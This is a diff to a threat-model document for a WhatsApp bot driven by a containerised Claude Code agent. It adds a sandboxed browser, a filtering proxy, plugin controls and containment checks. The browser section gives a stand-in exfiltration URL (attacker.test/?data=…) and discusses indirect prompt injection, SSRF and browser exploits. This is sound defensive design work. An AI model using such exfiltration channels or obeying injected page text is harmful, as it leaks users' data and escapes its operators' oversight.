@@ -44,13 +44,16 @@ it; in the deployed one, an allow list decides. Inbound messages are
 delivered to a Claude Code agent running with `--dangerously-skip-permissions`,
 which composes replies and sends them back through the same number.
 
-Three containers:
+Five containers — three at the core, and a browser with its own proxy beside
+them (T9):
 
 | Container | Trust | Holds | Network |
 |---|---|---|---|
 | `tulip-bridge` | trusted | WhatsApp credentials, message history, config | `tulip-wan` (internet) |
 | `tulip-agent` | **untrusted by design** | its own workspace only | `tulip-lan` (`internal: true`) |
 | `tulip-egress` | trusted, minimal | nothing | `tulip-lan` + `tulip-wan` |
+| `tulip-browser` | **untrusted by design** — renders any page | nothing; a tmpfs profile per page | `tulip-web` (`internal: true`) |
+| `tulip-webproxy` | trusted, minimal — the `tulip-egress` image, allowlist `*` | nothing | `tulip-web` + `tulip-wan` |
 
 Three Docker volumes form the entire interface between trusted and untrusted:
 
@@ -59,6 +62,14 @@ Three Docker volumes form the entire interface between trusted and untrusted:
 | `tulip-in` | read-write | **read-only** | message batches, current-turn pointer, received media |
 | `tulip-out` | read-write | read-write | outbound actions, agent status, files to send |
 | `tulip-workspace` | **read-only** | read-write | the agent's home: per-chat workspaces and Claude Code transcripts |
+
+Two more connect the bridge to the browser, in the same pattern and for the same
+reason. The browser and the agent share nothing at all.
+
+| Volume | `tulip-bridge` | `tulip-browser` | Carries |
+|---|---|---|---|
+| `browse-req` | read-write | **read-only** | one request per page: an id, an https URL, whether to take a picture |
+| `browse-res` | read-write | read-write | the browser's answer — hostile input — and a PNG beside it |
 
 **How far the agent's self-report is believed.** The agent writes a status file
 saying whether a turn is running. The bridge uses it to advance the queue
@@ -107,10 +118,15 @@ reason.
    B3  tulip-agent  ──►  tulip-bridge  outbox actions — HOSTILE by assumption
    B4  tulip-agent  ──►  tulip-egress  CONNECT requests — HOSTILE by assumption
    B5  Operator     ──►  tulip-bridge  control panel, control commands
+   B6  tulip-bridge ──►  tulip-browser  one https URL per request, re-checked by the bridge
+   B7  tulip-browser ──► tulip-bridge  page text and a screenshot — HOSTILE by assumption
+   B8  tulip-browser ──► tulip-webproxy CONNECT requests — HOSTILE by assumption
 ```
 
 **B2 and B3 are the load-bearing ones.** Everything in this document follows from
-treating the agent as already compromised.
+treating the agent as already compromised. B7 is the same shape as B3 and is
+handled the same way: the browser renders pages written by anybody, so it is
+treated as already compromised too (T9).
 
 ---
 
@@ -164,7 +180,7 @@ That is the designed outcome, not a failure.
 > **What the bridge sends out on the agent's behalf.** The layers below bound
 > what the *agent* can reach, and it can reach nothing. They say nothing about
 > the trusted side, which does leave the box: MiniMax for pictures and speech,
-> Exa for search, Giphy for GIFs, and — since inbound voice notes had to become
+> Exa for search, and — since inbound voice notes had to become
 > readable somehow — OpenAI for transcription. That last one is the only place a
 > stranger's own voice leaves this deployment. It carries the audio and nothing
 > else: no phone number, no chat key, no display name, and only for a message
@@ -212,7 +228,8 @@ irreducible — a bot that talks to you can tell you things — and it is why T4
 T6 matter: what it can tell you is limited to what it can see.
 
 **The tools widen this, and it is worth being exact about how.** The agent can
-ask the bridge to run a web search or read a page (`bridge/src/exa.ts`), and a
+ask the bridge to run a web search or read a page (`bridge/src/exa.ts`,
+`bridge/src/browse.ts`), and a
 search phrase is agent-controlled text that leaves the deployment. So the
 channel is no longer only "a reply to one chat" — it is also "up to 400
 characters, to a third party, on demand".
@@ -238,9 +255,16 @@ perform an HTTP request against a URL the agent chose. The bridge sits on both
 networks; a URL-fetching endpoint driven by an untrusted process is textbook
 server-side request forgery, and would hand the agent the reach that
 `internal: true` exists to deny — cloud metadata, the Docker gateway, anything
-else on the host's networks. Instead the bridge asks the *search provider* to
-retrieve the page. The only host that module ever connects to is the provider's
-API; the agent's URL travels as data in a JSON body, never as a destination.
+else on the host's networks. So the bridge dials nothing. It hands the URL to
+`tulip-browser` (T9) — a separate untrusted container whose only route is a proxy
+that refuses private addresses — and, failing that, to the *search provider*,
+whose API is the only host that module ever connects to. Either way the agent's
+URL travels as data in a file or a JSON body, never as a destination the bridge
+connects to.
+
+The rule's intent was never "no process may fetch an agent-chosen URL". It was
+"no process that can reach something private may". The browser is built to be
+the process that cannot, and T9 is the argument that it is.
 
 ### T3 — WhatsApp account takeover
 
@@ -283,7 +307,7 @@ Two independent controls:
 deny it existed.** `agent.crossChat` — default off — lets an action name a chat.
 An operator asked for it, because without it the agent could never introduce
 itself to anybody or pass on a message it was asked to pass on. It began as
-`sendTo`, text only; `voice`, `image`, `file` and `gif` may now name the same
+`sendTo`, text only; `voice`, `image` and `file` may now name the same
 destinations. That was a widening of *medium*, not of reach — the address space
 is identical, the switch is the same one, and the audit is the same — and the
 asymmetry was an accident of what got built first rather than a control:
@@ -509,7 +533,153 @@ transport.
 - `scripts/preflight.sh` refuses to start a deployment whose panel is bound to a
   non-loopback address without a token, or whose egress allowlist is empty.
 
+### T9 — Real browser access {#t9}
+
+*A3 prepares a page for the agent to open. Or A1/A2, controlling the agent, asks
+the browser to open something it should not be able to reach.*
+
+`fetch` used to be answered only by the search provider, and the search provider
+refuses any page that asks not to be indexed — which includes every site the
+operator builds. It said so in a per-URL status that the bridge threw away, so
+the agent was told "nothing found" about sites that were up, and concluded that
+the operator's whole domain was down. `fetch` now opens the page in a real
+browser first, and the search provider's refusals are passed on in words.
+
+**The rule this keeps.** T2 says the bridge must never dial a URL the agent
+chose. That is still true word for word: the bridge writes the URL into a file
+and reads an answer back. **The browser dials it — from a container that can
+reach nothing but a proxy that refuses private addresses.**
+
+- **`tulip-web` is `internal: true`.** No default route. Its only other member is
+  `tulip-webproxy`. The browser shares no network with the bridge — whose panel
+  listens on 0.0.0.0 inside its container — none with the agent, and none with
+  `tulip-egress`.
+- **No DNS**, exactly as for the agent. Chromium puts the hostname in the CONNECT
+  line and resolves nothing itself.
+- **`tulip-webproxy` is `tulip-egress` with the allowlist `*`.** Any public
+  hostname, port 443 only, and every resolved address checked against
+  `blockedReason()` — private, loopback, link-local and cloud metadata, CGNAT and
+  Tailscale, multicast, reserved — before a socket is opened, with the connection
+  made to the checked address rather than to a second lookup, so DNS rebinding
+  has no window. A name that is really a number (`127.0.0.1`, `0x7f.1`) is
+  refused before it is looked up. `*` must be written exactly: `**`, `*.` and the
+  like are configuration errors, not generous spellings of "everything".
+  `--proxy-bypass-list=<-loopback>` sends even `localhost` to the proxy, which
+  refuses it.
+- **The browser is hardened like the agent**: non-root, read-only root,
+  `cap_drop: [ALL]`, `no-new-privileges`, no setuid binaries, a size-capped tmpfs,
+  `pids_limit`. Chromium runs `--no-sandbox` because its own sandbox needs
+  capabilities the container deliberately lacks; the container is the sandbox. A
+  fresh profile per page, deleted afterwards, so nothing one page stores is there
+  for the next.
+- **Everything the browser writes is hostile input to the bridge** (B7). The
+  answer is strict JSON under a size cap, read with `O_NOFOLLOW | O_NONBLOCK`, so
+  a symlink planted in the volume is not followed into the bridge's namespace —
+  where `/state` holds the WhatsApp credentials — and a FIFO cannot hang it. A
+  failure arrives as a code from a closed list, never as prose, so a compromised
+  browser cannot write sentences the agent reads outside the "this is data"
+  banner. Text is capped and stripped of control characters again on receipt. A
+  screenshot is named by the bridge from the request id, never by the browser,
+  must begin with the PNG signature, and is capped at 3 MB. The bridge never
+  decodes it; it copies the bytes into the agent's read-only inbound volume, and
+  the agent — untrusted already — is what opens it.
+
+**What it costs**, stated rather than discovered:
+
+- **Chromium is a large attack surface, and it now faces the open internet.** A
+  renderer or V8 exploit is realistic for a motivated attacker. What it buys is a
+  container with nothing in it, one network, no route but the proxy, and write
+  access to an answer the bridge already treats as hostile: the bound of T1,
+  reached through a different door. Keep the image rebuilt — Debian's `chromium`
+  package is where the security fixes arrive, and for this image staleness is
+  itself the vulnerability.
+- **The Pi has no memory cgroup** (R6), so `mem_limit` on this container is
+  written down and not enforced. A page that allocates without bound could take
+  the host, and the bridge and the WhatsApp session with it. The controls that do
+  hold are applied by `browser/src/` itself: one page at a time (and one request
+  at a time from the bridge), `SIGKILL` to Chromium's whole process group at 20
+  seconds, a 256 MB JavaScript heap and a single renderer process, and a 256 MB
+  tmpfs, whose size the filesystem enforces with or without a cgroup. They bound
+  the common case, not every case — image and layout memory live outside the V8
+  heap. Enabling the memory controller (R6) turns the compose limit on as well.
+- **A proxy with a wildcard allowlist.** `tulip-webproxy` will connect to any
+  public host on 443, so the address check is no longer a second line behind a
+  short list — it *is* the line, which is why `egress/src/addresses.ts` and
+  `allowlist.ts` are held to near-complete test coverage. A name pointing at the
+  deployment's own public address reaches whatever that address serves to the
+  internet, which is public by definition — though a home router may answer its
+  own WAN address differently from inside than from outside. The agent cannot use
+  this proxy: it is not on `tulip-lan`, and `verify-containment.sh` asserts the
+  agent cannot reach it.
+- **Pages are now fetched from the deployment's own address.** Through the search
+  provider, a site saw the provider. Now it sees this host's public IP, so a page
+  the agent is asked to open can learn roughly where Tulip lives.
+- **The exfiltration channel is no wider.** The agent could already make the
+  search provider fetch `https://attacker.test/?data=…`. It can now make the
+  browser do it: the same channel, the same width — an agent-chosen URL, limited
+  by the per-turn tool allowance.
+- **A compromised browser can fill its volume, and so the disk.** The bridge
+  sweeps both browse volumes and never reads more than the caps above; it cannot
+  stop a hostile writer from writing. The agent's own volumes have the same
+  property.
+- **Indirect prompt injection (T6) is unchanged in kind and larger in reach.**
+  JavaScript-rendered and `noindex` pages now come back as text, and a screenshot
+  can carry text too. Same label at the point of use, same rule: data, never
+  instructions.
+
+If the browser is not deployed, or `TULIP_BROWSER` is unset, the bridge writes no
+request and `fetch` goes to the search provider alone, as it always did — now
+with its refusals explained.
+
 ---
+
+### T9 — Plugins
+
+**Threat.** Plugins are host services that send through the agent's number (a
+check-in, a ticket desk — see [PLUGINS.md](PLUGINS.md)). They are the one sender
+whose recipient is written in the request rather than resolved from a turn, so
+the concern is that the plugin path becomes a way to message anyone: either the
+agent reaching it, or a plugin misbehaving.
+
+**Controls.**
+
+- The plugins directory is bind-mounted into the **bridge only**. The agent has
+  no mount or network path that reaches it, and no verb that writes a plugin
+  action, so §T4's property — the agent cannot name a destination — is
+  unaffected. Nothing a conversation says can become a message a plugin sends.
+- Every plugin is **deny-by-default**: a directory with no `config.json` entry is
+  ignored, an entry is off until enabled, and an entry's recipient list starts
+  empty. `"any"` covers direct chats only; a group must be named. Kinds and an
+  hourly ceiling bound the rest. The grant is edited in `config.json`, which the
+  agent cannot write; the panel can only switch a plugin on or off.
+- Actions are strictly parsed (unknown fields refused), files are opened with
+  `O_NOFOLLOW` and checked on the descriptor, file names are plain names inside
+  the plugin's own directory, and a plugin directory that is a symbolic link is
+  ignored — the same care as §T7 applies to the agent's outbound files, for the
+  same reason: `/state` is in this container's namespace.
+- A chat an operator has blocked is refused.
+
+**Callable plugins** run the other way: the agent asks a plugin something
+(`pluginCall`) and the bridge relays it, exactly as it relays `fetch` to the
+browser. The plugin's credentials never enter the bridge or the agent — what
+crosses is an action name and string arguments one way and text the other. The
+bridge refuses the call before writing anything unless the plugin is enabled as
+callable, the action is in its manifest and every argument name is declared for
+it, and calls are **operator-only by default**: allowed only on a turn carrying
+operator authority, which a group never does. The answer is hostile-ish text — a
+plugin may relay what its own users wrote — so it is read `O_NOFOLLOW`, as a
+regular file, size-capped and strictly parsed, stripped of control characters,
+and shown to the agent inside a banner as data from that service, not
+instructions. And a plugin can do only what its own service implements: the
+worst a hostile conversation can do is call a listed action, with odd strings,
+at the rate the turn's tool allowance permits — which is the plugin's own input
+validation to handle, as for any caller. An operator who sets `operatorOnly:
+false` opens that to everybody the agent answers, groups included.
+
+**Residual.** A plugin is trusted to the extent of its grant: one with
+`recipients: "any"` can message any number, at its hourly rate, and is only as
+careful as its own code. That is the operator's choice to run it, made visible
+on the panel and bounded by the switch.
 
 ## 5. Residual risks {#residual-risks}
 
@@ -526,6 +696,9 @@ been read carefully.
 | R6 | **A compromised agent can exhaust host resources.** | Bounded by `pids_limit`, `cpus` and `mem_limit` — *provided the host kernel exposes those cgroup controllers*. It may not: Raspberry Pi OS ships with the memory controller **disabled**, and Docker discards a limit it cannot enforce with a single warning line during startup. `scripts/preflight.sh` checks for this explicitly, because a resource cap that is written down but not in force is worse than one that was never claimed. Enable it with `cgroup_enable=memory cgroup_memory=1` in `/boot/firmware/cmdline.txt` and reboot. |
 | R8 | **A prepared web page is an un-blockable injection vector.** Search results cannot be rate-limited by sender, because there is no sender. | Accepted as the cost of the agent being able to check facts instead of guessing at them. Bounded by T1 — the container is worth nothing — and by results being labelled as data at the point of use. Remove the tools if the trade stops being worth it: they are two action kinds in `shared/src/handoff.ts` and one module in the bridge. |
 | R7 | **The operator's control panel token is a bearer credential.** Anyone holding it can restart sessions, read message history, and change who the bot answers — including opening it to anyone. | Loopback-bound by default; exposing it is an explicit operator decision documented in `OPERATIONS.md`. Configuring Cloudflare Access authentication removes the need to share it at all, which is the mitigation for more than one operator. |
+| R9 | **A browser exploit.** `tulip-browser` renders pages from anywhere, and Chromium is the largest attack surface in the deployment. | Bounded by T9: the container holds nothing, has no route but a proxy that refuses private addresses, shares no network with the bridge or the agent, and can only write an answer the bridge treats as hostile. Mitigated by rebuilding the image, which is how Chromium's security fixes arrive. |
+| R10 | **The browser can exhaust memory on a host without a memory cgroup.** On the Pi `mem_limit` is not enforced (R6). | Bounded, not prevented, by `browser/src/chromium.ts`: one page at a time, a hard `SIGKILL` of the process group at 20 seconds, a 256 MB JavaScript heap and one renderer, and a size-capped tmpfs. Enabling the memory controller makes the compose limit real as well. |
+| R11 | **`tulip-webproxy` allows any public host.** Its address filter is the only thing between a page and the host's private networks. | The filter resolves once and connects to the checked address, refuses every private, loopback, link-local, CGNAT/Tailscale and reserved range, and is exhaustively unit-tested; `verify-containment.sh` checks loopback, metadata and a public name that resolves to loopback against the live proxy. The agent cannot reach this proxy. |
 
 ---
 
@@ -560,7 +733,18 @@ It asserts, from inside the running agent container, that:
 13. `sudo` is not installed and no setuid binary exists.
 14. `CAP_SYS_ADMIN` is not held.
 
-Plus two assertions about the bridge, which is hardened identically.
+Plus two assertions about the bridge, which is hardened identically, and the same
+two about each proxy.
+
+When `tulip-browser` is running, it asserts the browser's containment too: that
+it has no default route and no working DNS, cannot connect to a public address,
+the bridge's network or the agent's proxy directly, is on neither `tulip-lan`
+nor `tulip-wan` and shares no network with the bridge, is not root, holds no
+capabilities, has a read-only root and a read-only request volume, and has no
+setuid binaries. Through `tulip-webproxy` it checks that a public site on 443 is
+reachable and that another port, a loopback address, the metadata address and a
+public name resolving to loopback are all refused. And from the agent, that the
+browser's proxy is unreachable.
 
 Unit tests cover the trust-boundary logic directly: the outbox validator, the
 turn-pinning resolver, the gate, the rate limiter, and the proxy allowlist —
